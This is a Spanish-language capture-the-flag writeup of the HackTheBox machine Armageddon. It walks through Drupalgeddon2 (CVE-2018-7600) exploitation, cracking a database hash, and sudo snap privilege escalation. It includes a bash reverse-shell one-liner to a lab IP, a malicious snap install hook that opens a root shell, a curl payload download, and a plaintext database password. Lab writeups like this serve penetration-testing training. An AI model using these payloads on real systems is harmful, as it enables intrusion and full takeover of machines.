---
title: "Armageddon"
date: 2025-04-08 11:47:46 +0200
categories: writeups hackthebox
tags: drupal cve criptografía sudoers máquina snap linux
description: Writeup de la máquina Armageddon de HackTheBox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Reconocimiento

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224165652.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.10.233`.
### Nmap

En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.10.233 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224165903.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.10.233 -oN targeted
```

Lo que podemos sacar en claro es que la versión del **OpenSSH** es vulnerable a un **User Enumeration**, es decir que podemos saber si un usuario existe en el sistema o no. Además, gracias al escaneo de **Nmap** podemos saber que en la página web está alojado un **Drupal**.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224170146.png>)

___
## Explotación

En la página web (Puerto **80**) veremos como efectivamente estamos ante un **Drupal**, por lo que en este caso lo que procede es aplicar un **Droopescan**.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224170354.png>)

Para descargarnos la herramienta **Droopescan** debemos dirigirnos a este repositorio [droopescan](https://github.com/SamJoan/droopescan#Installation) y realizar los pasos de la instalación que en definitiva sería:

```bash
pip3 install droopescan
```

Observamos como nos da error relacionada con el entorno de **python3**.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224170940.png>)

Una solución efectiva y rápida es crear un entorno para ello debemos ejecutar lo siguiente:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip3 install droopescan # Ahora si que nos deja instalar el droopescan
```

Una vez instalado el **Droopescan** procederemos con el escaneo que sería de la siguiente forma:

```bash
droopescan scan --url http://10.10.10.233
```

Lo más destacable del escaneo realizado es la versión del **Drupal** pues está usando la **7.56** (versión posiblemente vulnerable).

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224171354.png>)

Realizando una búsqueda en **searchsploit** nos daremos cuenta como existen varios exploits pero los que más nos interesan son los **RCEs** que no hace falta estar **Aunthenticated**, es decir los **Drupalgeddon2**.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224171518.png>)

Gracias a **searchsploit** nos descargaremos el exploit de **python** y le cambiaremos el nombre a uno más identificativo:

```bash
searchsploit -m php/webapps/44448.py
mv 44448.py drupal_exploit.py
```

Observamos que al ejecutarlo nos da un error por lo que buscaremos en internet por el **CVE-2018-7600**.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224172044.png>)

El primer resultado es este repositorio de [Github - CVE-2018-7600](https://github.com/pimps/CVE-2018-7600) por lo que nos descargaremos en exploit de la siguiente forma usando **wget**:

```bash
wget https://raw.githubusercontent.com/pimps/CVE-2018-7600/refs/heads/master/drupa7-CVE-2018-7600.py
```

> Si nos da un error de que no encuentra una librería activaremos el entorno temporal que recientemente hemos creado e instalaremos la librería necesaria en este caso **bs4**, es decir ejecutaremos lo siguiente:
> 
	`source .venv/bin/activate`
	`pip3 install bs4`

Al ejecutar dicho script observaremos como este si que funciona, pues nos está devolviendo el **output** del comando `whoami`.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224172734.png>)

En este caso lo que debemos de hacer es enviarnos una **Reverse Shell** para ello ejecutaremos el script de la siguiente forma:

```bash
python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"
```

___
## Escalada de privilegios

Observamos como recibimos la **Reverse Shell** correctamente por lo que ahora deberíamos hacer un **Tratamiento de la TTY** pero en está máquina me ha sido imposible realizarlo por lo que tocará apañarse con esta shell incómoda.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224173016.png>)

Lo primero que se me ocurre es mirar el contenido de los archivos de configuración de **Drupal** y observar si alguno de ellos contiene información valiosa como lo son las contraseñas o nombres de usuarios. Tras realizar una pequeña búsqueda me encuentro que en **Drupal** hay un archivo en `/sites/default/settings.php` en cual contiene información de valor.

Si realizamos un grep de la palabra **password** en dicho archivo veremos una contraseña en texto plano:

> Otra forma válida hubiera sido revisar el archivo poco a poco en busca de alguna credencial.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224173459.png>)

Observamos que la credencial encontrada pertenece a una base de datos llamada **drupal** y además el usuario para acceder a ella es **drupaluser**.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224173925.png>)

Si intentamos acceder a la base de datos de la manera habitual veremos como se nos queda petada ya que no tenemos una consola interactiva por lo que debemos de buscar otra forma de realizar consultas a la base de datos de **drupal**.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224174522.png>)

Nuestra solución a este problema es el parámetro `-e` de **mysql command-line**, es decir para realizar una consulta donde se muestren todas las tables debemos de ejecutar el siguiente comando:

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -h localhost -D drupal -e "show tables" 
```

Entre todas las tables que nos devuelve la más interesante de ellas es la de `users`.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224174823.png>)

Ejecutaremos una nueva consulta pero esta vez sobre la tabla `users`, en definitiva sería el siguiente comando:

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -h localhost -D drupal -e "select * from users" 
```

Observamos que dicha tabla tiene el hash del usuario **brucetherealadmin**.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224175057.png>)

Una vez tenemos el hash en un archivo archivo ejecutaremos el siguiente comando para romper el hash con **johntheripper**:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224175218.png>)

> En vez de usar **johntheripper** podemos usar **hashcat** pero dicha herramienta es un poco más complicada ya que debemos de identificar el tipo de hash. El hash podemos identificarlo de varias formas: 
> - Documentación oficial de **hashcat** vía web: [Hashcat - example-hashes](https://hashcat.net/wiki/doku.php?id=example_hashes).
> - Documentación oficial de **hashcat** vía terminal: `hashcat --example-hashes`.
> - Herramienta web que lo detecta automáticamente: [hashes.com](https://hashes.com/en/tools/hash_identifier).
> 
> Una vez localizado el tipo de hash procederemos a romperlo usando **hashcat** de la siguiente forma donde hemos de indicar el modo (**7900**) y el tipo de ataque (**fuerza bruta - 0**):
> `hashcat -m 7900 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.tx`

Una vez hemos conseguido romper el hash intentaremos acceder a través de **ssh** de la siguiente forma:

```bash
ssh brucetherealadmin@10.10.10.233
```

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224180307.png>)

En este caso si que tenemos una consola interactiva, para que nos funcione el <kbd>CTRL</kbd> + <kbd>L</kbd> debemos ejecutar `export TERM=xterm`. 

Una vez llegado a este punto realizaremos las mismas comprobaciones de siempre para intentar elevar nuestros privilegios y nos daremos cuenta que tenemos un permiso **Sudoers** el cual nos permite ejecutar el comando **snap install** como **root** sin proporcionar contraseña.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224180717.png>)

Si nos dirigimos a la página de **GTFO-Bins](https://gtfobins.github.io/gtfobins/snap/#sudo) nos daremos cuenta como podemos abusar de este permiso de [Sudoers** para elevar nuestros privilegios.

En definitiva lo que debemos de hacer es crear un paquete malicioso de **snap** en nuestra máquina víctima, para ello ejecutaremos los siguiente comandos:

```bash
mkdir -p meta/hooks
cd !?
# Creamos un fichero malicioso que nos envie una ReverseSh
echo -e "#\!/bin/sh\nbash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'" > install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
python3 -m http.server 80
```

Antes de ejecutar los siguiente comandos hemos de ponernos en escucha con **NetCat** (`nc -nvlp 443`), y luego en la máquina víctima debemos de ejecutar lo siguiente:

```bash
cd /tmp
curl http://10.10.14.5/xxxx_1.0_all.snap -O
sudo -u root /usr/bin/snap install xxxx_1.0_all.snap --devmode
```

Observamos como recibimos la **Reverse Shell** como **root** por lo que ya habríamos **pwneado** la máquina.

![](<../assets/images/posts/2025-04-08-armageddon/Pasted image 20241224181618.png>)